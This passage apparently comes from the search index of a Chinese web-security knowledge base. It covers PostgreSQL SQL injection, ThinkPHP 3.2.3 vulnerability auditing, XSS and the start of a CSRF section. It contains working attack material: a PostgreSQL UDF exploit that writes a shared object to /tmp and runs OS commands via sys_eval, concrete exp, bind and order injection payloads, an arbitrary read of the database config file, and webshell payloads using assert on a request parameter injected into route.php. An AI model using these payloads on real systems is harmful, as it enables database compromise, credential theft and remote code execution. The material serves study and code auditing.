0000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 5, decode('d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000', 'hex')); SELECT lo_export(9023, '/tmp/testeval.so'); 执行命令： CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/testeval.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE; select sys_eval('id'); drop function sys_eval; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-12 10:38:15 "},"知识库/01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html","title":"常见防御手段及绕过方式","keywords":"","body":"由于DBMS大部分都使用通用语言（SQL），因此基本功能和语法实际上是通用的。这意味着在DBMS上的绕过技巧可能会应用在不同的数据库中。实战中没有遇到过postgresql。有更好的绕过方式再继续添加 空格被绕过 + 注释符 and/or 被绕过 双写 大小写 内联注释 编码 unicode utf-8 url 单引号被过滤 $$ select 'test' -- 等价于 select $$test$$ $quote$ -- 适用于当$$ 不能利用的情况下 select $quote$test$quote$ CHR SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72); -- 等效于 SELECT 'ABCDEFGH'; 注意：您不能同时使用'、$$ 、$quote$，因此，如果您需要转义以单引号开头的字符串，则将无法使用$$(即这种语句是无效的SELECT 'test$$;) 比较符(> between a and b 等号 被过滤/拦截 like > 注释符 被过滤/拦截 手动闭合 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 13:02:12 "},"知识库/01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html":{"url":"知识库/01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html","title":"SQL注入之伪静态页面布尔注入","keywords":"","body":"背景 从QAX出来之后，当上了快乐安服仔。虽然以前实习那会儿干过安服，但是手艺不精，现在重操旧业，快乐安服，冲！ 今天在做SRC审核的时候，发现GET型参数中，注入的语句中存在xxx and 1=1.html，我当时心想这是混SRC吗？本想立即驳回这个漏洞的时候，我的好奇心驱使我把白帽子的报告看完，当我看到后面就发现确实人家白帽子盲注是将数据库名给注入出来了。当时我就傻了，立马复测。 测试详情 提出问题 在测试之前，所有的页面都是以html结尾，心想这就是个静态web资源吧，但是心想白帽子把payload都写得明明白白了，这里.html这里多半有妖怪，然后我在这里将*.html的文件后缀更改为了不常见的文件后缀，顺便看看thinkphp的banner信息 我尝试了很多不存在的文件后缀，发现解析都是200，这里就有提出一个疑问了，如果他真是静态资源文件，那么为什么访问一个服务器上不存在的资源还能正常解析？ 这里我问了我的hxd，确定存在了应该是存在我的hxd所说的内东西 测试结果 and 1=1 恒成立 and 1=2 恒false 标准的布尔盲注 总结 目前只遇到了thinkphp类的伪静态页面，在这种伪静态页面中，带有的参数是会和数据库交互，并且极有可能存在sqli，所以在测试诸如此类问题的时候，可以尝试是否解析静态资源文件来判断 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-12 10:19:24 "},"知识库/01.WEB安全/01.SQLi/ThinkPHP 3.2.3 SQLi.html":{"url":"知识库/01.WEB安全/01.SQLi/ThinkPHP 3.2.3 SQLi.html","title":"ThinkPHP 3.2.3 SQLi","keywords":"","body":"前言 由于最近审漏洞很多白帽子交来的是thinkphp的sql注入，手法很简单，但是还是想以代码审计的方式去研究一下ThinkPHP的相关漏洞。在选择thinkphp框架的时候，也想了很久很久，最后还是以3.2.3为例，顺便学学代码审计相关的知识。 本次选择的CMS是 yxtcmf6.1 ，它是19年3月发布且基于thinkphp3.2.3开发的cms，这个对于php代码审计小白是比较友好的。 审计思路 这个CMS是采用MVC架构开发的，首先要了解MVC架构以及文件结构，需要知道不同的页面对应的文件位置 M(Model) : 应用程序用于处理数据逻辑的部分，通常模型对象负责在数据库中存取数据 V(View): 应用程序用于处理数据显示的部分，通常视图是依据模型创建的 C(Controller): 应用程序用于处理用户交互的部分，通常控制器负责从视图读取数据（参数），控制用户输入输出，并向模型发送数据 然后需要了解thinkphp3.2.3这个框架，大致过一遍thinkphp3.2.3完全开发手册 最后可以结合静/动态扫描工具再看看 了解结构以及路由方式 目录结构中关注Application，因为这个是各种Controller所在的目录，还有相关的配置文件，如路由配置router.php(这种文件一般在conf目录下，去找用户自定义的配置文件) 比如这个路由中，user/login/index，（前台首页） 对应的目录就是${TP}/application/User/Controller/LoginController.class.php，对应执行的操作就是index()函数 tp3.2.3 .->where(\"可控参数\")->find() 在这里我使用前台登录处做一个sql注入 => where(payload)->find() 的测试，文件路径在${TP}/application/User/Controller/LoginController.class.php 我截取登录的相关代码，如下所示 function ajaxlogin(){ $username=$_POST['account']; $password=$_POST['password']; // 实例化 User $users_model=M('Users'); // 判断输入是否是手机号 if(preg_match('/^\\d+$/', $username)){ $where['mobile']=$username; }else{ // 判断输入是否是邮件 if(strpos($username,\"@\")>0){ $where['user_email']=$username; }else{ // 否则user_login 字段为用户名 $where['user_login']=$username; } } // 数据库交互处 $result = $users_model->where($where)->find(); 在这里我调试一波，使用thinkphp中的exp表达式，payload如下 account[0]=exp&account[1]=='admin' and updatexml(1,concat(0x23,user(),0x23),1)%23&password=admin&ipForget=true 我们主要看exp表达式，查询thinkphp完全开发手册 EXP 表达式注入 那么我们的构造的exp表达则为 $where=array(\"user_login\"=> array( 0 => \"exp\", 1 => \"='admin' and updatexml(1,concat(0x23,user(),0x23),1)%23\") ); 跟进调试可以看一下，在这里我们强制进入一下where函数 经过一系列 if else最后进入到最后一个else里，这里是指将我们传入的where参数赋值给$this->options里的where，$this->options是查询表达式参数，里面包含了子语句（如where,limit等等） return 之后返回到 $users_model->where($where)继续调find()方法，单步运行，进入find 函数，此时未传入参数，当前参数$options为空，然后在$this->_parseOptions($options);方法下，将options 中的where表达式，table，以及model取到，然后进行$this->db->select($options) 在这里，我们进入select方法，在这里可以看到我们传入了table，where，model，然后准备进行拼接sql语句， 然后我们进入buildSelectSql函数，来查看到底是怎样拼接的sql语句。 进入之后，可以看到先是计算分页，然后再使用了parseSql函数，再次跟进$this->parseSql()函数，其次查看当前$this->selectSql # $this->selectSql SELECT%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT% 在parseSql这个函数中，将会替换SQL语句中的表达式 当我们到parseWhere函数中，我们主要从505行开始看，因为前面一系列判断都是判断是否传入的是字符串，以及定义操作符 从505行开始，开始遍历$where这个数组中的值，一直单步走，直到536行 在此，就开始遍历$where[$key]，开始拼接sql语句，在这里我们进入parseWhereItem($this->parseKey($key),$val)，从这里开始就是形成sql注入的关键所在了 在第570行，当判断是exp表达式的时候，这里就会拼接$wherestr + $key + $val[1]，当前$key = user_login ，$val[1] = payload，拼接起来这里的$wherestr = user_login ='admin' and updatexml(1,concat(0x23,user(),0x23),1)# 然后再返回到parseWhere()函数中，又会拼接Where字符串，连起来就是where user_login ='admin' and updatexml(1,concat(0x23,user(),0x23),1)# 再返回到parseSql()函数中，把最后的sql表达式替换完成，就会发现，exp表达式，直接将sql语句拼接起来了，我们可以看到当前的sql语句是 SELECT * FROM `edu_users` WHERE `user_login` ='admin' and updatexml(1,concat(0x23,user(),0x23),1)# LIMIT 1 就直接完成了exp表达式的sql注入 不成功案例：常规注入 如果我们不使用exp表达式，直接使用传统的sql注入方式，进行注入，可以看到，因为$val = admin' or '1'='1不是数组，直接进入else判断 在这里可以看到parseValue()，我们将$value传入之后，直接会进入第一个条件判断中 这个escapeString函数就不多说了吧。。。单引号被转义，无法闭合，导致无法完成sql注入 .->find/select/delete(\"可控参数\") 这里find方法传参默认以pk(主键)来查询，这里我们构造一个测试页面，因为我找了一下，没有找到合适可以用于测试的controller，所以自己写一个简单 \"; $id=$I['id']; $test = M(\"test\"); $data = $test->find($id); echo $data; } } payload id[where]=1 and updatexml(1,concat(0x23,user(),0x23),1)%23 id[where]注入 调试一波，强制进入find函数 $options 是一个数组，传入为{where => \"1 and updatexml(1,concat(0x23,user(),0x23),1)%23\"}，然后直接单步走，跳过if 语句（这里等会会细讲，先注意一下） 然后到748行，开始分析表达式，进入_parseOptions（这里也强调一下，等会会讲）,一直单步下去，在648行开始，字段类型检验的时候，由于不满足条件，直接就返回$options 然后在这里，就到了回到了select，将解析后的options带入拼接sql语句 在这里我们继续看buildSelectSql()这个函数 分页逻辑不看，继续跟进parseSql里的parseWhere 这里$where是字符串，就直接赋值了，然后就返回了 那么完整的sql如下，完整闭合sql语句，报错注入完成 ->where(\"可控参数\")->save(\"可控参数\") 我在这里全局搜索，找到了在忘记密码处，满足条件，但是这里需要短信验证码辅助，以及查询是否存在该用户，我这里没有配置短信服务器，以及需要满足where，save可控这一条件，所以我单独把短信验证，以及用户名验证的这一逻辑给注释掉，如果不注释掉查询用户名这一逻辑，直接用exp表达式注入即可。 function repassword(){ $users_model=M(\"Users\"); $mobile_verify=$_POST['mobileCode']; $password=$_POST['password']; $repassword=$_POST['repassword']; $mobile=$_POST['tel']; $where['mobile']=$mobile; if(strlen($password) 20){ $result['code']='password'; $result['success']=false; $result['message']=\"密码长度至少5位，最多20位！\"; } // elseif($password !=$repassword){ // $result['code']='repassword'; // $result['success']=false; // $result['message']=\"两次密码不一致！\"; // } // elseif($mobile_verify !=$_SESSION['mobile_verify']){ // $result['code']='mobile_verify'; // $result['success']=false; // $result['message']=\"手机验证码不正确！\"; // } // elseif(!$users_model->where($where)->find()){ // $result['code']='user'; // $result['success']=false; // $result['message']=\"该手机号未注册！\"; // } else{ $data['user_pass']=sp_password($password); if($users_model->where($where)->save($data)){ $result['success']=true; unset($_SESSION['mobile_verify']); $result['message']=\"密码重置成功！\"; }else{ $result['success']=false; $result['message']=\"密码重置失败\"; } } $json_string = json_encode($result); echo $json_string; } 在这里，我们使用payload bind注入 tel[0]=bind&tel[1]=0 and (updatexml(1,concat(0x3a,(user())),1))%23&password=123456 在RegisterController.class.php中设置断点，进入$users_model->where($where)->save($data) 此时传入where的参数$where是一个array 在这里直接赋值给$this.options[where]然后就直接返回，再调用save函数 再来看save函数，到第416行，开始分析表达式，在这里就直接原封不动地返回了$options[where] 继续向下，走到第451行开始，这里就会拼接sql 在第895行，开始拼接update 然后在第899行，开始拼接where，我们注意在第899行，在进行一系列运算之后，在满足bind的情况下，$wherestr = $key =:0 and ... 最后返回回来的sql语句就如下所示(这个是预编译的sql) 然后在execute这个函数，执行sql操作 最后在绑定参数的时候就将:0绑定成了出入的repassword语句如下所示，完成报错注入 ->order(\"可控参数\")->find() payload id=1&order[updatexml(1,concat(0x23,user(),0x23),1)] 根据上面的调试过程，我相信大家也懂了，我们主要看parseOrder函数，由于我们传入的参数是order[updatexml(1,concat(0x23,user(),0x23),1)]，order参数是一个数组，key为payload，val为空字符串，在经过690行的处理之后，就会把key和val拼接在一起，然后将$array用,分隔开，赋值给$order 最后返回$order,其实不一定要配置$order的键值为payload，如果order 不为数组，就直接返回$order了 拼接成的sql语句如下 案例分析 大概知道了几个tp3.2.3的sql注入后，就可以搜索这些关键词来寻找sql注入 后台AD控制器SQL注入 payload id=1) and updatexml(1,concat(0x23,user(),0x23),1)%23 这里很重要的是where参数虽然可控，但是取参数是使用的I()方法，I()方法在这里强调一下，如果传入的参数是一个数组，（此处传入的不是数组，数组可看示例1），如果使用exp表达式注入，exp 会强行加入一个空格，导致在判断是否是exp表达式时会判断出错，导致无法注入 在这里就是一个整形注入，在这里传入的参数是字符串，则会在第1811行加上key为_string 在parseWhere 方法中，whereStr直接拼接了 $this->parseThinkWhere($key,$val);跟进parseThinkWhere，可以看到当key 为_string，$wherestr 直接拼接了$val 最后拼接成的sql如下所示 后台任意文件读取 $file 由$dir 和$name 拼接而成，$dir 为根路径，$name为传入可控的变量，虽然经过html实体化编码，但是文件名不需要输入<>，所以就没影响，就可以读取任意文件 传入参数../data/conf/db.conf，调用如下 后台写入文件getshell 跟着大佬看了一下sp_get_routes这个函数 function sp_get_routes($refresh=false){ $routes=F(\"routes\"); if( (!empty($routes)||is_array($routes)) && !$refresh){ return $routes; } // $routes 是从route表里获取的array $routes=M(\"Route\")->where(\"status=1\")->order(\"listorder asc\")->select(); $all_routes=array(); $cache_routes=array(); foreach ($routes as $er){ // $er['full_url'] 是从$routes里的键值分离出来的 // $full_url 是$er['full_url']赋值而来 $full_url=htmlspecialchars_decode($er['full_url']); // 解析URL $info = parse_url($full_url); $path = explode(\"/\",$info['path']); if(count($path)!=3){//必须是完整 url continue; } $module=strtolower($path[0]); // 解析参数 $vars = array(); if(isset($info['query'])) { // 解析地址里面参数 合并到vars parse_str($info['query'],$params); $vars = array_merge($params,$vars); } $vars_src=$vars; ksort($vars); $path=$info['path']; $full_url=$path.(empty($vars)?\"\":\"?\").http_build_query($vars); $url=$er['url']; if(strpos($url,':')===false){ $cache_routes['static'][$full_url]=$url; }else{ $cache_routes['dynamic'][$path][]=array(\"query\"=>$vars,\"url\"=>$url); } // $all_routes 为$full_url赋值 $all_routes[$url]=$full_url; } F(\"routes\",$cache_routes); $route_dir=SITE_PATH.\"/data/conf/\"; if(!file_exists($route_dir)){ mkdir($route_dir); } $route_file=$route_dir.\"route.php\"; // 再将all_routes 的值写入到$route_file里 file_put_contents($route_file, \" 那么如果能在route表中的full_url字段中插入一句话木马，就可以将其写入到route.php里面了，那么此处可以查看哪里有写入route的方法，全局查看，在admin下的route控制器下就有调用sp_get_routes() 对应的页面如下，且原始网址对应的参数就是full_url，且action对应的后端路由为add_post()函数 我们来随便写一下，来看一下sql语句是怎样的。在insert 函数里，bindParam的时候，传入带有'的参数也带入数据库中了。 而此时我们如果执行成功之后，会写入到route.php中，如果能闭合route.php中的单引号，就能getshell了 执行成功之后会返回到route/index中，就会执行sp_get_routes函数 接下来我们分析sp_get_routes函数中能成功写入route.php中的条件，首先full_url是原始网址，显示网址是url $full_url=htmlspecialchars_decode($er['full_url']); // 解析URL $info = parse_url($full_url); // 这里以/ 分割path $path = explode(\"/\",$info['path']); // 如果path不等于3 ，就继续下一个循环 if(count($path)!=3){//必须是完整 url continue; } 在if条件语句中，我们可以看到解析的full_url要3个，在这里写了一个代码，只要full_url 为 a/b/c就可以绕过if语句，执行下面的操作 走到后面可以看到如下代码，只要写入了$all_routes，也不需要<> 等，就可以转换成合法的php代码 $url=$er['url']; // $all_routes 为$full_url赋值 $all_routes[$url]=$full_url; file_put_contents($route_file, \" 那么在$url 里写一个一句话木马，就能将其写入到$route_file里了 // 1 full_url: a/b/c url: aaa' @assert($_REQUEST['cmd']),' // 2 full_url: a/b/c',@assert($_REQUEST['cmd']),' url: aaa 参考链接 https://blog.csdn.net/qsort_/article/details/109909796 https://www.freebuf.com/vuls/236421.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:42:42 "},"知识库/01.WEB安全/02.XSS/":{"url":"知识库/01.WEB安全/02.XSS/","title":"02.XSS","keywords":"","body":"定义 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击 XSS分为：反射型XSS，存储型XSS，DOM型XSS 反射型XSS 具体攻击流程如下： 攻击者将payload放置在url链接中（这是针对是GET型反射XSS） 用户点击该恶意链接 web服务将XSS代码（JavaScript代码）以及视图返回给客户端 客户端解析视图以及XSS代码（JavaScript代码），并将执行结果发送到XSS平台 攻击者访问XSS平台，读取用户的敏感信息（Cookie） 存储型XSS 具体攻击流程如下： 攻击者向web服务插入XSS代码 web服务会将其结果存储到数据库中 用户正常访问web服务 web服务将数据库的数据以及视图返回给前端，前端渲染视图并加载数据，其中数据里包含恶意XSS代码（JavaScript代码） 客户端渲染视图，加载XSS代码，并向攻击者的web服务发送敏感信息 攻击者读取用户的敏感信息 DOM型XSS 具体攻击流程如下： 攻击者将payload放置在url链接中（这是针对是GET型反射XSS） 用户点击恶意链接，并打开浏览器 此时浏览器客户端并不会发起http请求到web服务，而是在浏览器客户端执行XSS（JavaScript代码） 此时将XSS代码执行结果发送给攻击者的恶意服务 攻击者访问自己的XSS平台并读取用户的敏感信息 XSS 特征 类别 特征 反射型XSS 非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。 存储型XSS 持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie DOM型XSS 不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型 XSS与CSRF的区别（面试常问） 类别 特征 XSS 1. 主要是加载JavaScript代码，在客户端执行2. 虽然经过后端，数据库（存储型），但主要需要客户端执行XSS代码，才能生效3. DOM型XSS一定不经过后端，只是对浏览器客户端发起的攻击4. XSS攻击针对的是用户层面的攻击 （攻击客户端） CSRF 1. 主要是欺骗服务器，虽然是由用户发起，但是服务器无法判断是否是不是用户想要发起的请求2. 一定会经过后端处理，不然无法执行3. CSRF是一种身份伪造攻击，来对服务器进行欺骗的一种攻击手法 XSS 攻击面 XSS主要是攻击客户端浏览器，但是客户端浏览器侧的JavaScript并不像Node.js这种后端JavaScript代码可以执行命令，那么XSS只能用来弹窗测试吗？实际上并不是这样的，如果你的JavaScript代码能力很强，那么可以钓鱼、窃取Cookie、令牌、攻击浏览器（2021年4月Chrome 0 Day）、蠕虫攻击、挂黑页（放广告刷流量）、内网探测（针对HTTP，websocket）等等 黑盒测试 尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些： URL的每一个参数 URL本身 表单 搜索框 常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等 白盒测试(代码审计) 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。 PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。 也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。 大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。 同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。 XSS 相关payload xss 主要是针对浏览器客户端的一种攻击，那么需要执行JavaScript代码，那么无疑需要使用到JavaScript语言以及在HTML中可以加载JavaScript的标签 标签类 script 标签是最直接的XSS payload，标签可以在浏览器渲染DOM树的时候同步执行JavaScript代码，他可以引用外部，也可以将代码插入标签内 alert(\"xss\") alert(/xss/) alert(1) alert(document.cookie) svg 标签是标记定义 SVG 图形的容器，其在onload方法中是在 SVG 容器初始化的时候执行代码 img 标签是加载图片资源的标签，其在无法加载图片资源的时候会执行onerror方法 body 是定义HTML文档的主体。其包含文档的所有内容（比如文本、超链接、图像、表格和列表等等。） video 标签是引用远程媒体视频的标签，用法与img类似 style 标签是加载CSS资源的标签 表单类 在web中，最常见的为表单了，表单中的标签有、等等 在这里更多的是闭合语句来构成XSS比如 \"/>alert(/xss/) >alert(/xss/) ... 事件类 在HTML中有许多事件操作的方法（DOM事件），如onclick事件，ondblclick事件等等，只需要用户点击，或者双击也可以执行JavaScript代码，在这里就需要闭合，在块级元素中添加事件方法。 常见的DOM事件方法如下 鼠标事件 属性 描述 DOM onclick 当用户点击某个对象时调用的事件句柄。 2 oncontextmenu 在用户点击鼠标右键打开上下文菜单时触发 ondblclick 当用户双击某个对象时调用的事件句柄。 2 onmousedown 鼠标按钮被按下。 2 onmouseenter 当鼠标指针移动到元素上时触发。 2 onmouseleave 当鼠标指针移出元素时触发 2 onmousemove 鼠标被移动。 2 onmouseover 鼠标移到某元素之上。 2 onmouseout 鼠标从某元素移开。 2 onmouseup 鼠标按键被松开。 2 键盘事件 属性 描述 DOM onkeydown 某个键盘按键被按下。 2 onkeypress 某个键盘按键被按下并松开。 2 onkeyup 某个键盘按键被松开。 2 框架/对象（Frame/Object）事件 属性 描述 DOM onabort 图像的加载被中断。 ( ) 2 onbeforeunload 该事件在即将离开页面（刷新或关闭）时触发 2 onerror 在加载文档或图像时发生错误。 ( , 和 ) onhashchange 该事件在当前 URL 的锚部分发生修改时触发。 onload 一张页面或一幅图像完成加载。 2 onpageshow 该事件在用户访问页面时触发 onpagehide 该事件在用户离开当前网页跳转到另外一个页面时触发 onresize 窗口或框架被重新调整大小。 2 onscroll 当文档被滚动时发生的事件。 2 onunload 用户退出页面。 ( 和 ) 2 表单事件 属性 描述 DOM onblur 元素失去焦点时触发 2 onchange 该事件在表单元素的内容改变时触发( , , , 和 ) 2 onfocus 元素获取焦点时触发 2 onfocusin 元素即将获取焦点时触发 2 onfocusout 元素即将失去焦点时触发 2 oninput 元素获取用户输入时触发 3 onreset 表单重置时触发 2 onsearch 用户向搜索域输入文本时触发 ( ) onselect 用户选取文本时触发 ( 和 ) 2 onsubmit 表单提交时触发 2 剪贴板事件 属性 描述 DOM oncopy 该事件在用户拷贝元素内容时触发 oncut 该事件在用户剪切元素内容时触发 onpaste 该事件在用户粘贴元素内容时触发 打印事件 属性 描述 DOM onafterprint 该事件在页面已经开始打印，或者打印窗口已经关闭时触发 onbeforeprint 该事件在页面即将开始打印时触发 拖动事件 事件 描述 DOM ondrag 该事件在元素正在拖动时触发 ondragend 该事件在用户完成元素的拖动时触发 ondragenter 该事件在拖动的元素进入放置目标时触发 ondragleave 该事件在拖动元素离开放置目标时触发 ondragover 该事件在拖动元素在放置目标上时触发 ondragstart 该事件在用户开始拖动元素时触发 ondrop 该事件在拖动元素放置在目标区域时触发 多媒体（Media）事件 事件 描述 DOM onabort 事件在视频/音频（audio/video）终止加载时触发。 oncanplay 事件在用户可以开始播放视频/音频（audio/video）时触发。 oncanplaythrough 事件在视频/音频（audio/video）可以正常播放且无需停顿和缓冲时触发。 ondurationchange 事件在视频/音频（audio/video）的时长发生变化时触发。 onemptied 当期播放列表为空时触发 onended 事件在视频/音频（audio/video）播放结束时触发。 onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。 onloadeddata 事件在浏览器加载视频/音频（audio/video）当前帧时触发触发。 onloadedmetadata 事件在指定视频/音频（audio/video）的元数据加载后触发。 onloadstart 事件在浏览器开始寻找指定视频/音频（audio/video）触发。 onpause 事件在视频/音频（audio/video）暂停时触发。 onplay 事件在视频/音频（audio/video）开始播放时触发。 onplaying 事件在视频/音频（audio/video）暂停或者在缓冲后准备重新开始播放时触发。 onprogress 事件在浏览器下载指定的视频/音频（audio/video）时触发。 onratechange 事件在视频/音频（audio/video）的播放速度发送改变时触发。 onseeked 事件在用户重新定位视频/音频（audio/video）的播放位置后触发。 onseeking 事件在用户开始重新定位视频/音频（audio/video）时触发。 onstalled 事件在浏览器获取媒体数据，但媒体数据不可用时触发。 onsuspend 事件在浏览器读取媒体数据中止时触发。 ontimeupdate 事件在当前的播放位置发送改变时触发。 onvolumechange 事件在音量发生改变时触发。 onwaiting 事件在视频由于要播放下一帧而需要缓冲时触发。 动画事件 事件 描述 DOM animationend 该事件在 CSS 动画结束播放时触发 animationiteration 该事件在 CSS 动画重复播放时触发 animationstart 该事件在 CSS 动画开始播放时触发 过渡事件 事件 描述 DOM transitionend 该事件在 CSS 完成过渡后触发。 其他事件 事件 描述 DOM onmessage 该事件通过或者从对象(WebSocket, Web Worker, Event Source 或者子 frame 或父窗口)接收到消息时触发 onmousewheel 已废弃。 使用 onwheel 事件替代 ononline 该事件在浏览器开始在线工作时触发。 onoffline 该事件在浏览器开始离线工作时触发。 onpopstate 该事件在窗口的浏览历史（history 对象）发生改变时触发。 onshow 该事件当 元素在上下文菜单显示时触发 onstorage 该事件在 Web Storage(HTML 5 Web 存储)更新时触发 ontoggle 该事件在用户打开或关闭 元素时触发 onwheel 该事件在鼠标滚轮在元素上下滚动时触发 事件对象 常量 静态变量 描述 DOM CAPTURING-PHASE 当前事件阶段为捕获阶段(1) 1 AT-TARGET 当前事件是目标阶段,在评估目标事件(1) 2 BUBBLING-PHASE 当前的事件为冒泡阶段 (3) 3 属性 属性 描述 DOM bubbles 返回布尔值，指示事件是否是起泡事件类型。 2 cancelable 返回布尔值，指示事件是否可拥可取消的默认动作。 2 currentTarget 返回其事件监听器触发该事件的元素。 2 eventPhase 返回事件传播的当前阶段。 2 target 返回触发此事件的元素（事件的目标节点）。 2 timeStamp 返回事件生成的日期和时间。 2 type 返回当前 Event 对象表示的事件的名称。 2 方法 方法 描述 DOM initEvent() 初始化新创建的 Event 对象的属性。 2 preventDefault() 通知浏览器不要执行与事件关联的默认动作。 2 stopPropagation() 不再派发事件。 2 目标事件对象 方法 方法 描述 DOM addEventListener() 允许在目标事件中注册监听事件(IE8 = attachEvent()) 2 dispatchEvent() 允许发送事件到监听器上 (IE8 = fireEvent()) 2 removeEventListener() 运行一次注册在事件目标上的监听事件(IE8 = detachEvent()) 2 事件监听对象 方法 方法 描述 DOM handleEvent() 把任意对象注册为事件处理程序 2 文档事件对象 方法 方法 描述 DOM createEvent() 2 鼠标/键盘事件对象 属性 属性 描述 DOM altKey 返回当事件被触发时，\"ALT\" 是否被按下。 2 button 返回当事件被触发时，哪个鼠标按钮被点击。 2 clientX 返回当事件被触发时，鼠标指针的水平坐标。 2 clientY 返回当事件被触发时，鼠标指针的垂直坐标。 2 ctrlKey 返回当事件被触发时，\"CTRL\" 键是否被按下。 2 Location 返回按键在设备上的位置 3 charCode 返回onkeypress事件触发键值的字母代码。 2 key 在按下按键时返回按键的标识符。 3 keyCode 返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 2 which 返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 2 metaKey 返回当事件被触发时，\"meta\" 键是否被按下。 2 relatedTarget 返回与事件的目标节点相关的节点。 2 screenX 返回当某个事件被触发时，鼠标指针的水平坐标。 2 screenY 返回当某个事件被触发时，鼠标指针的垂直坐标。 2 shiftKey 返回当事件被触发时，\"SHIFT\" 键是否被按下。 2 方法 方法 描述 W3C initMouseEvent() 初始化鼠标事件对象的值 2 initKeyboardEvent() 初始化键盘事件对象的值 XSS的绕过方式 JavaScript伪协议 javascript:alert(/xss/); 111 编码 浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。 首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会。介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。 浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。 xss 双写 大小写 一些案例 参考链接 https://www.runoob.com/jsref/dom-obj-event.html XSS（跨站脚本）详解 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 15:06:28 "},"知识库/01.WEB安全/03.CSRF/":{"url":"知识库/01.WEB安全/03.CSRF/","title":"03.CSRF","keywords":"","body":"定义 跨站请求伪造（也称为 CSRF）是一种 Web 安全漏洞，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 具体的攻击流程如下： 用户正常登录web服务，并一直保持在线 服务器返回用户凭证Session ，并将其保存在Cookie中 攻击者生成payload，并放置在用户可访问的地方 攻击者诱导用户点击在第3步放置的链接，此时用户一直在线，且是用同一浏览器打开（保证Cookie未失效） 用户点击恶意链接 恶意链接向服务器请求，由于用户Cookie未失效，就携带用户Cookie访问服务器 服务器收到请求，此时用户Cookie 未失效，并判定为“用户”发起的正常请求，并做出响应 所以CSRF其实是利用的是服务器对客户端的信任策略，以默认信任客户端发起的请求都是经过用户本人发起的漏洞，以达到欺骗服务器的目的，虽然WEB的身份验证机制可以保证一个请求是来自于哪个用户的浏览器，但是却不能保证请求是否由本人发起的。所以一般防范CSRF攻击有如下方法： 服务端验证referer 